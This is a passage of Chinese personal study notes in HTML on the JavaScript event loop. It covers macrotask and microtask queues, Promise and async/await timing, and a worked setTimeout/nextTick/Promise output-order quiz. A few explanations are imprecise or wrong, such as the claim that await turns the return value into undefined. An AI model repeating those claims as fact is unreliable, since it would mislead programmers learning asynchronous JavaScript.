引擎首先从 macrotask queue 中取出第一个任务，执行完毕后，将 microtask queue 中的所有任务取出，按顺序全部执行；</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">2. 然后再从 macrotask queue 中取下一个，执行完毕后，再次将 microtask queue 中的全部取出；</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">3. 循环往复，直到两个 queue 中的任务都取完。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">浏览器环境中的任务种类，按照优先级：</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">宏任务：</span></font><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">同步代码、setTimeout/setInterval、postMessage、MessageChannel、I/O</span></span></div><div><font color="#FF0000" style="font-size: 12pt;"><br/></font></div><div><font color="#FF0000" style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">微任务：Promise.then、MutationObserver、</span></font><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Object.observe（已废弃， proxy 对象替代）、queueMicrotask(func)</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">以下是微任务（</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">await 之后（下面）的代码也是微任务</span></span></span><span style="font-size: 12pt; font-weight: bold;">）：</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"> </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Promise.then catch finally</span></span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"> </span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">     </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">微任务</span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">   </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise.then 是具有代表性的微任务，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">有些浏览器实现的 promise 将 then 方法放到了宏任务中</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">new Promise 在实例化的过程中所执行的代码都是同步进行的，而 then 中注册的回调才是异步执行的。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">只有涉及到状态变更后才需要被执行的回调才算是微任务，</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">也就是说只有 then()，catch() 或 finally() 方法内的回调函数</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">是异步执行的。</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">其他所有的代码执行都是宏任务（同步执行）。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise V8引擎自带，所以是微任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">async / await</span></div><div><br/></div><div><span style="font-size: 12pt;">async 函数</span><span style="font-size: 12pt;">在 await 之前</span><span style="font-size: 12pt;">的代码都是同步执行的，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">可以理解为 await 之前的</span><span style="font-size: 12pt; color: unset; font-family: unset;">代码属于 new Promise 时传入的代码</span><span style="font-size: 12pt;">（如果 await</span> <span style="font-size: 12pt;">旁边</span><span style="font-size: 12pt;">调用的函数里没有 .then 等，即 await 普通函数，则</span><span style="font-size: 12pt;">包括 await 那一行也属于同步任务，相当于被 Promise.resolve() 包裹</span><span style="font-size: 12pt;">），</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">await 之后（下面）</span><span style="font-size: 12pt;">的所有代码都是在 Promise.then 中的回调，所以 await 之后的代码属于微任务</span><span style="font-size: 12pt;">（</span><span style="font-size: 12pt;">如果 await 旁边调用的函数里有 .then 等，则包括 await 也属于微任务</span><span style="font-size: 12pt;">），</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">一句话：await 之后都是微任务，而 await 那一行的函数是不是微任务，取决于有没有使用 .then() .catch() .finally()</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">await 会执行那一行函数但是会阻塞那一行函数的返回值</span></span> <span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(118, 0, 216); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">（返回值会阻塞为 undefined）</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-family: unset; font-weight: bold;">直到外面的同步宏任务都执行完成了，才会重新回到阻塞的位置，之后正常获取返回值，继续往下执行，async 函数才会执行结束</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-family: unset; font-weight: bold;">async 函数执行结束后，如果有 .then 则像 Promise 一样放入异步微任务队列</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"> new MutaionObserver()   </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">MutationObserver 是 HTML5 中的新API，是个用来监视DOM变动的接口。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">它能监听一个DOM对象上发生的子节点删除、属性修改、文本内容修改等等。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">● </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">process.nextTick()             </span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Node独有</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">● </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Object.observe                  废弃</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">以下</span></span><span style="font-size: 12pt; font-weight: bold;">是宏</span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">任务（同步任务与异步任务）</span></span><span style="font-size: 12pt; font-weight: bold;">：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">● &lt;script&gt;全部代码&lt;/script&gt;</span> <span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">第一次宏任务 </span></span></span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">同步宏任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">● </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">setImmediate()  （Node.js 环境）</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">浏览器暂时不支持，只有IE10支持</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">● setInterval() </span></span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;"> setTimeout() </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">● </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">postMessage</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">● </span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">MessageChannel</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(255, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">● </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">I/O               </span></span>  <span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">       </span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">事件监听 DOM操作  用户输入输出 </span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">发起一个网络请求 读取文件 </span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">与程序产生交互的这些都可以叫作 I/O</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">    </span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">所以 ajax 网络请求是宏任务，</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">fetch、fs.readFile，这些都</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">相当于注册了一个宏任务         </span> </div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">注意，人工合成（synthetic）的事件派发（dispatch）是同步任务，包括执行 click() 和 dispatchEvent() 这两种方式。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">也就是说手动用代码触发事件是同步任务，只有浏览器自己触发的事件才是放在一个 宏任务里。</span></span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">        </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">除了同步代码是同步宏任务，其它都是异步宏任务。</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">                         </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 16px; color: rgb(118, 0, 216); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold; text-decoration: line-through;">● </span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold; text-decoration: line-through;">requestAnimationFrame </span>    </span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">requestAnimationFrame </span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">既不属于宏任务，也不属于微任务</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">requestAnimationFrame 是 GUI 渲染之前执行，但在异步微任务之后，可以看作宏任务(比定时器优先级高的异步宏任务)</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">不过 requestAnimationFrame 不一定会在当前帧必须执行，由浏览器根据当前的策略自行决定在哪一帧执行。</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">  </span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;">一道题总结</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font color="#000000" style="font-size: 12pt;">console.log('1');</font></div><div><font color="#000000"><br/></font></div><div><font color="#000000" style="font-size: 12pt;">setTimeout(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">    console.log('2');</font></div><div><font color="#000000" style="font-size: 12pt;">    process.nextTick(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">        console.log('3');</font></div><div><font color="#000000" style="font-size: 12pt;">    })</font></div><div><font color="#000000" style="font-size: 12pt;">    new Promise(function(resolve) {</font></div><div><font color="#000000" style="font-size: 12pt;">        console.log('4');</font></div><div><font color="#000000" style="font-size: 12pt;">        resolve();</font></div><div><font color="#000000" style="font-size: 12pt;">    }).then(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">        console.log('5')</font></div><div><font color="#000000" style="font-size: 12pt;">    })</font></div><div><font color="#000000" style="font-size: 12pt;">})</font></div><div><font color="#000000"><br/></font></div><div><font color="#000000" style="font-size: 12pt;">process.nextTick(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">    console.log('6');</font></div><div><font color="#000000" style="font-size: 12pt;">})</font></div><div><font color="#000000"><br/></font></div><div><font color="#000000" style="font-size: 12pt;">new Promise(function(resolve) {</font></div><div><font color="#000000" style="font-size: 12pt;">    console.log('7');</font></div><div><font color="#000000" style="font-size: 12pt;">    resolve();</font></div><div><font color="#000000" style="font-size: 12pt;">}).then(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">    console.log('8')</font></div><div><font color="#000000" style="font-size: 12pt;">})</font></div><div><font color="#000000"><br/></font></div><div><font color="#000000" style="font-size: 12pt;">setTimeout(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">    console.log('9');</font></div><div><font color="#000000" style="font-size: 12pt;">    process.nextTick(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">        console.log('10');</font></div><div><font color="#000000" style="font-size: 12pt;">    })</font></div><div><font color="#000000" style="font-size: 12pt;">    new Promise(function(resolve) {</font></div><div><font color="#000000" style="font-size: 12pt;">        console.log('11');</font></div><div><font color="#000000" style="font-size: 12pt;">        resolve();</font></div><div><font color="#000000" style="font-size: 12pt;">    }).then(function() {</font></div><div><font color="#000000" style="font-size: 12pt;">        console.log('12')</font></div><div><font color="#000000" style="font-size: 12pt;">    })</font></div><div><font color="#000000" style="font-size: 12pt;">})</font></div></div><div><br/></div><div><span style="font-size: 12pt;">第一轮事件循环流程分析如下：</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">● 整体 script 作为第一个宏任务进入主线程，遇到 console.log，输出 1 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 遇到 setTimeout，其回调函数被分发到宏任务 Event Queue 中。我们暂且记为 setTimeout1 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 遇到 process.nextTick()，其回调函数被分发到微任务 Event Queue 中。我们记为 process1 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 遇到 Promise，new Promise 直接执行，输出 7 。then 被分发到微任务 Event Queue 中。我们记为 then1 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 又遇到了 setTimeout，其回调函数被分发到宏任务 Event Queue 中，我们记为 setTimeout2 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-10-24_210935.jpg" type="image/jpeg" data-filename="2021-10-24_210935.jpg" width="267"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">  </span><span style="font-size: 12pt;">上表是第一轮事件循环宏任务结束时各 Event Queue 的情况，此时已经输出了 1 和 7 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="font-size: 12pt;"> 我们发现了 process1 和 then1 两个微任务。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="font-size: 12pt;"> 执行 process1，输出 6 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="font-size: 12pt;"> 执行 then1，输出 8 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">好了，第一轮事件循环正式结束，这一轮的结果是输出 1，7，6，8 。那么第二轮事件循环从 setTimeout1 宏任务开始：</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 首先输出 2。接下来遇到了 process.nextTick()，同样将其分发到微任务 Event Queue 中，记为 process2 。 </span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">    new Promise 立即执行输出 4， then 也分发到微任务Event Queue中，记为 then2 。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/2021-10-24_210949.jpg" type="image/jpeg" data-filename="2021-10-24_210949.jpg" width="264"/></div><div><br/></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 第二轮事件循环宏任务结束，我们发现有 process2 和 then2 两个微任务可以执行。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 输出 3 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 输出 5 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 第二轮事件循环结束，第二轮输出 2，4，3，5 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 第三轮事件循环开始，此时只剩 setTimeout2 了，执行。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 直接输出 9 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 将 process.nextTick() 分发到微任务 Event Queue 中。记为 process3 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 直接执行 new Promise，输出 11 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 将 then 分发到微任务Event Queue中，记为 then3 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-10-24_211004.jpg" type="image/jpeg" data-filename="2021-10-24_211004.jpg" width="269"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 第三轮事件循环宏任务执行结束，执行两个微任务 process3 和 then3 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 输出 10 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 输出 12 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">●</span><span style="font-size: 12pt;"> 第三轮事件循环结束，第三轮输出 9，11，10，12 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">整段代码，共进行了三次事件循环，完整的输出为 1，7，6，8，2，4，3，5，9，11，10，12 。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"> (请注意， node 环境下的事件监听依赖 libuv 与前端环境不完全相同，输出顺序可能会有误差)</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">Event Loop</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [4].gif" type="image/gif" 